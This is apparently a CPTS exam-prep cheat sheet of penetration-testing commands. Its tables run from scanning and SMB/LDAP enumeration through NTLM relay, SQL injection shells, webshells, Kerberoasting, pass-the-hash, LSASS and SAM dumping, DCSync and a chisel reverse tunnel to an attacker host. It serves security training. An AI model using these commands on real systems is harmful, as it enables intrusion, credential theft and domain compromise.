# COMMAND CENTER — CPTS Operator Dashboard

> Credential handling → `./CREDENTIAL_DECISION_TREE.md` • Tracking → `./CREDENTIAL_TRACKING_GUIDE.md`

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                          EXAMLAUNCH (0-30 MIN)                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ T1: sudo nmap -sn scope/24 -oA live                                     ║
║ T2: sudo nmap scope/24 -p 80,443,8080,8443,445,22,5985,3389 -oA quick   ║
║ T3: sudo responder -I tun0 -wrf                                          ║
║ T4: kerbrute userenum -d domain --dc target users.txt                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

┌─────────────────────────────────────────────────────────────────────────────┐
│  WHAT DO I ENUMERATE?                                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│ SMB (445)      │ smbclient -N -L //tgt │ rpcclient enumdomusers             │
│                │ enum4linux -a tgt     │ nmap --script smb2-security-mode   │
├────────────────┼───────────────────────┼───────────────────────────────────┤
│ LDAP (389)     │ ldapsearch -x -b      │ netexec ldap tgt -u '' -p '' -M u │
│                │ bloodhound-python     │ ldapdomaindump                     │
├────────────────┼───────────────────────┼───────────────────────────────────┤
│ WEB (80/443)   │ whatweb tgt           │ gobuster dir -u tgt -w medium.txt │
│                │ ffuf -u tgt/FUZZ      │ nikto -h tgt                       │
├────────────────┼───────────────────────┼───────────────────────────────────┤
│ KERBEROS (88)  │ kerbrute userenum     │ GetNPUsers (AS-REP)               │
│                │ nmap --script krb5-*  │                                    │
├────────────────┼───────────────────────┼───────────────────────────────────┤
│ OTHER          │ ftp tgt (anon)        │ showmount -e tgt                   │
│                │ snmpwalk -c public    │ dig axfr @tgt domain               │
└────────────────┴───────────────────────┴───────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  WHAT DO I EXPLOIT?                                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│ SMB NULL SESSION → Users → netexec smb tgt -u users.txt -p 'Password1!'    │
│ SMB SIGNING OFF  → Relay → ntlmrelayx.py -tf targets.txt -smb2support      │
│                   → ADCS → ntlmrelayx.py -t http://dc/certsrv -adcs        │
│ SMB WRITABLE     → Upload shell → SCF attack → Startup folder abuse         │
├─────────────────────────────────────────────────────────────────────────────┤
│ WEB SQLi         → sqlmap -u tgt?id=1 --batch --os-shell                    │
│ WEB LFI          → ../../../etc/passwd → php://filter → log poisoning       │
│ WEB FILE UPLOAD  → Shell via upload → RCE                                   │
│ WEB ADMIN ACCESS → Template/plugin edit → Webshell                          │
├─────────────────────────────────────────────────────────────────────────────┤
│ MSSQL SA         → sp_configure 'xp_cmdshell',1 → RECONFIGURE → EXEC xp    │
│ MSSQL LINKED     → sp_linkedservers → EXEC('cmd') AT [linked]              │
│ MYSQL ROOT       → LOAD_FILE /etc/shadow → INTO OUTFILE webshell           │
├─────────────────────────────────────────────────────────────────────────────┤
│ KERBEROS AS-REP  → GetNPUsers -request → hashcat -m 18200                  │
│ KERBEROS SPN     → GetUserSPNs -request → hashcat -m 13100                 │
│ PTH              → psexec.py -hashes :hash u@tgt                            │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  WHAT DO I DO AFTER A SHELL?                                                │
├─────────────────────────────────────────────────────────────────────────────┤
│ LINUX SHELL (0-5 min):                                                      │
│ sudo -l → id → uname -a → cat /etc/passwd → cat /etc/crontab               │
│ cat ~/.bash_history → find / -perm -4000 → Upload linpeas                   │
│ cat /etc/shadow (if root) → cat ~/.ssh/id_rsa                               │
├─────────────────────────────────────────────────────────────────────────────┤
│ WINDOWS SHELL (0-5 min):                                                    │
│ whoami /priv → whoami /groups → systeminfo                                  │
│ SeImpersonate? → PrintSpoofer.exe -i -c powershell → SYSTEM                 │
│ reg save HKLM\SAM → procdump.exe -ma lsass.exe lsass.dmp                    │
│ cmdkey /list → dir /s web.config → type ConsoleHost_history.txt             │
├─────────────────────────────────────────────────────────────────────────────┤
│ EVERY SHELL (always do these):                                              │
│ netstat -ano / ss -tulpn → ip addr / ipconfig /all                          │
│ arp -a → route print → cat /etc/hosts                                       │
│ ps aux / Get-Process → Check running procs                                  │
│ Check docker group → docker ps → docker -v /:/mnt                           │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  WHAT DO I DO AFTER CREDENTIALS?                                            │
├─────────────────────────────────────────────────────────────────────────────┤
│ FOUND PASSWORD → Test EVERYWHERE IMMEDIATELY:                              │
│ netexec smb <subnet>/24 -u user -p pass --continue-on-success              │
│ netexec winrm <subnet>/24 -u user -p pass --continue-on-success            │
│ netexec ssh <subnet>/24 -u user -p pass --continue-on-success              │
│ netexec mssql <subnet>/24 -u user -p pass --continue-on-success            │
├─────────────────────────────────────────────────────────────────────────────┤
│ FOUND NTLM HASH → PTH FIRST, ASK QUESTIONS LATER:                          │
│ psexec.py -hashes :hash user@tgt │ wmiexec.py -hashes :hash user@tgt       │
│ evil-winrm -i tgt -u user -H hash                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│ FOUND NETNTLMV2 → Crack or Relay:                                          │
│ SMB signing off? → ntlmrelayx.py -tf targets.txt -smb2support               │
│ SMB signing on? → hashcat -m 5600 hash.txt rockyou.txt                     │
├─────────────────────────────────────────────────────────────────────────────┤
│ DOMAIN USER OBTAINED → BloodHound (mandatory):                              │
│ bloodhound-python -d dom -u user -p pass -ns dc -c all                      │
│ Then: AS-REP roast → Kerberoast → LAPS → Delegation check                   │
├─────────────────────────────────────────────────────────────────────────────┤
│ DOMAIN ADMIN OBTAINED → DCSync (immediate):                                 │
│ impacket-secretsdump -just-dc dom/user:pass@dc                              │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  WHAT DO I DO IF STUCK?                                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│ NO FOOTHOLD:                                                                │
│ 1. Rescan: nmap -p- tgt (full port) — missed a service?                    │
│ 2. Rescan: nmap -sU --top-ports tgt — UDP services?                        │
│ 3. Check alternate ports: 8000, 8080, 8443, 8888, 9001, 9090               │
│ 4. Re-check SMB null + LDAP anon (easy to miss)                            │
│ 5. Re-check web: gobuster with larger wordlist + extensions                 │
│ 6. Responder still running? Hashes may appear after activity                │
│ 7. Check if there's a separate application/API endpoint                     │
├─────────────────────────────────────────────────────────────────────────────┤
│ SHELL BUT STUCK:                                                            │
│ 1. Upload pspy (Linux) or procexp (Windows) — timed tasks?                  │
│ 2. Re-run linpeas/winpeas — missed something?                              │
│ 3. Check ALL cron jobs / scheduled tasks                                   │
│ 4. Check ALL SUID / service permissions                                    │
│ 5. Check kernel exploits (searchsploit)                                    │
│ 6. The credential you need might not be ON this host                       │
├─────────────────────────────────────────────────────────────────────────────┤
│ DOMAIN ACCESS BUT STUCK:                                                    │
│ 1. Re-run BloodHound — check ALL edges, not just shortest path             │
│ 2. Check ACL abuse paths (GenericAll, WriteDACL, ForceChangePassword)      │
│ 3. Check delegation (unconstrained, constrained, RBCD)                     │
│ 4. Check LAPS, gMSA, GPP, MSSQL linked servers                             │
│ 5. Check trusts (nltest /domain_trusts)                                    │
│ 6. Check if you missed AS-REP or Kerberoast users                          │
│ 7. Check for ADCS (ESC1-8) — certificate services                          │
├─────────────────────────────────────────────────────────────────────────────┤
│ COMPLETELY STUCK (no progress in 4+ hours):                                 │
│ 1. Take 5 min break — step away                                            │
│ 2. Re-read exam objectives — what are you missing?                         │
│ 3. Re-scan all IPs with -p- — you missed something                        │
│ 4. Check internal DNS — new subdomains/hosts?                              │
│ 5. Check if there's a subnet you haven't pivoted to                        │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  QUICK COMMAND REFERENCE (Most Used)                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│ netexec smb/winrm/ssh/mssql tgt -u user -p pass -M module                  │
│ evil-winrm -i tgt -u user -p pass                                          │
│ impacket-psexec /wmiexec/smbexec /secretsdump                              │
│ bloodhound-python -d dom -u user -p pass -ns tgt -c all                    │
│ hashcat -m 1000/5600/13100/18200 hash.txt rockyou.txt -r best64.rule       │
│ responder -I tun0 -wrf                                                     │
│ ntlmrelayx.py -tf targets.txt -smb2support                                 │
│ gobuster dir -u http://tgt -w wordlist.txt -x php,asp,txt                  │
│ smbclient -N -L //tgt │ rpcclient -U "" -N tgt                             │
│ ssh -D 1080 user@tgt -N     (SOCKS proxy setup)                           │
│ ./chisel server -p 8000 --reverse   (attacker)                             │
│ ./chisel client attacker:8000 R:socks   (victim)                           │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  QUICK ACCESS: Where to Go for More Detail                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│ Battle Cards: ../battlecards/SMB.md, LDAP.md, Kerberos.md, etc.           │
│ Finding→Action: ../operator/finding-to-action.md                           │
│ Attack Priority: ../operator/attack-priority.md                            │
│ Service Matrix: ../operator/service-to-attack-matrix.md                    │
│ 80/20 Reference: ../operator/cpts-80-20.md                                 │
│ Playbooks: ../playbooks/linux/windows/domain/local-shell-obtained.md      │
│ Decision Trees: ../decision-trees/                                         │
│ Full Methodology: ../MASTER_METHODOLOGY.md                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```
